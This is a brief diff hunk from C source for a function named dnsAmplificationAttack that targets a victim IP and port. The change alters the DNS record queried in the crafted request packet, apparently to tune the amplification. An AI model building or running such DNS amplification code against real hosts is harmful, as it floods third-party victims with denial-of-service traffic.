@@ -88,7 +88,7 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
 
 	/* Set headers */
 	unsigned char dnsRequestPacket[139];
-	unsigned char *dnsRecord = "www.github.com";
+	unsigned char *dnsRecord = "github.com";
 	
 	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
 	setDnsHeader(dns);
